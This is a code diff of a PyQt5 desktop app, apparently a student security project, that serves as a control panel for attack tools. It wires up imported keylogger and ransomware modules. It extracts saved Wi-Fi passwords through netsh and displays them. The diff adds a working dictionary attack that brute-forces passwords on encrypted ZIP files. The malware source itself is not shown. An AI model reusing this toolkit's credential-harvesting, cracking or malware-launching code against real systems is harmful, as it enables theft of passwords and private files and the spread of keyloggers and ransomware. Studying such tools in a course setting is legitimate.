@@ -2,11 +2,13 @@ import time
 
 from PyQt5 import uic
 from PyQt5.QtCore import QObject, QThread, pyqtSignal
-from PyQt5.QtWidgets import QApplication, QMainWindow, QPushButton, QFrame, QWidget, QStackedWidget, QTextEdit, QLabel
+from PyQt5.QtWidgets import QApplication, QMainWindow, QPushButton, QWidget, QStackedWidget, QTextEdit, QLabel, \
+    QFileDialog
 import sys
 
+import pyzipper
 import os
-from threading import Thread, Timer
+from threading import Thread
 import subprocess
 import re
 from shutil import copytree
@@ -15,6 +17,9 @@ from malwares.keylogger.keylogger import start_keylogger
 from malwares.ransomware.generate_public_private_keys import generate
 from malwares.ransomware.ransom import start
 from malwares.ransomware.decode import decrypt_fernet_key
+from malwares.zip_password_cracking.cracker import zip_open
+
+
 # to open designer
 # qt5-tools designer
 
@@ -23,6 +28,9 @@ class Worker(QObject):
     finished = pyqtSignal()
     progress = pyqtSignal(str)
 
+    def __init__(self, file=None):
+        super().__init__()
+        self.file = file
     def read_log(self):
         with open('log.txt', 'r') as f:
             f.seek(0, 2)
@@ -38,15 +46,32 @@ class Worker(QObject):
         print("END thread")
         self.finished.emit()
 
+    def zip_crack(self):
+        passwords_file = 'malwares\\zip_password_cracking\\passwords'
+        print(self.file)
+        with open(passwords_file, 'rb') as f:
+            for passwords in f.readlines():
+                password = passwords.strip()
+                # print(password)
+                try:
+                    with pyzipper.AESZipFile(self.file, 'r') as cats_zip:
+                        cats_zip.extractall(pwd=password)
+                        print(f'Poprawne haslo to: {password}')
+                        self.progress.emit(str(password))
+                        break
+                except:
+                    pass
+        self.finished.emit()
 
 class App(QMainWindow):
+
     def __init__(self):
         super(App, self).__init__()
         uic.loadUi("ui/app_ui.ui", self)
         self.setWindowTitle("app")
 
         self.desktop = os.path.expanduser('~') + "\\Desktop"
-        self.hacker_dir = self.desktop+'\\hacker'
+        self.hacker_dir = self.desktop + '\\hacker'
         # pages
         self.stack = self.findChild(QStackedWidget, "stackedWidget")
 
@@ -68,13 +93,10 @@ class App(QMainWindow):
         self.keylogger_start = self.findChild(QPushButton, "start_keylogger")
         self.keylogger_start.clicked.connect(self.keylogger_run)
         self.keylogger_output = self.findChild(QTextEdit, "output_k")
-        self.k_keylogger_thread = Thread(target=start_keylogger)
+        self.k_keylogger_thread = None
         self.k_log_thread = None
+        self.k_worker = None
         self.k_text = ''
-
-        self.k_log_thread = QThread()
-        self.k_worker = Worker()
-        self.k_worker.moveToThread(self.k_log_thread)
 
         # ransomware
         self.r_stack = self.findChild(QStackedWidget, "ransom_stack")
@@ -96,14 +118,23 @@ class App(QMainWindow):
         # zip
         self.zip_path_label = self.findChild(QLabel, "file_label")
         self.zip_find_file = self.findChild(QPushButton, "find_file")
+        self.zip_find_file.clicked.connect(self.zip_get_file)
         self.zip_start = self.findChild(QPushButton, "zip_start")
-
+        self.zip_start.clicked.connect(self.zip_run)
+        self.zip_resukt_label = self.findChild(QLabel, "zip_password")
+        self.zip_file_path = None
+        # 'F:\\6 semestr\cyberbez2\\cybersecurity-project\\malwares\\zip_password_cracking\\cat.zip'
         self.show()
 
         self.stack.setCurrentWidget(self.findChild(QWidget, "page_1"))
 
     def keylogger_run(self):
+        self.k_keylogger_thread = Thread(target=start_keylogger)
         self.k_keylogger_thread.start()
+
+        self.k_worker = Worker()
+        self.k_log_thread = QThread()
+        self.k_worker.moveToThread(self.k_log_thread)
 
         self.k_log_thread.started.connect(self.k_worker.read_log)
         self.k_worker.finished.connect(self.k_log_thread.quit)
@@ -170,7 +201,8 @@ class App(QMainWindow):
 
                 wifi_profile = {}
 
-                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
+                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name],
+                                              capture_output=True).stdout.decode()
 
                 if re.search("Security key {11}: Absent", profile_info):
                     continue
@@ -190,6 +222,36 @@ class App(QMainWindow):
             self.wifi_text += f'ssid: {wifi_list[x]["ssid"]} || password: {wifi_list[x]["password"]}\n'
         self.wifi_output.setText(self.wifi_text)
 
+    def zip_get_file(self):
+        frame = QFileDialog.getOpenFileName(self, 'Open file', self.desktop, "ZIP files (*.zip)")
+        self.zip_file_path = frame[0]
+        self.zip_path_label.setText(self.zip_file_path)
+
+    def zip_run(self):
+
+        self.zip_worker = Worker(file=self.zip_file_path)
+        self.zip_thread = QThread()
+        self.zip_worker.moveToThread(self.zip_thread)
+
+        self.zip_thread.started.connect(self.zip_worker.zip_crack)  #
+        self.zip_worker.finished.connect(self.zip_thread.quit)  #
+        self.zip_worker.finished.connect(self.zip_worker.deleteLater)  #
+        self.zip_thread.finished.connect(self.zip_thread.deleteLater)  #
+        self.zip_worker.progress.connect(self.zip_report)
+
+        self.zip_thread.start()
+
+        self.zip_find_file.setEnabled(False)
+        self.zip_start.setEnabled(False)
+        self.zip_thread.finished.connect(self.zip_reset)
+        # zip_open(self.zip_file_path)
+
+    def zip_reset(self):
+        self.zip_find_file.setEnabled(True)
+        self.zip_start.setEnabled(True)
+
+    def zip_report(self, text):
+        self.zip_resukt_label.setText(f'Password: {text}')
 
 app = QApplication(sys.argv)
 win = App()
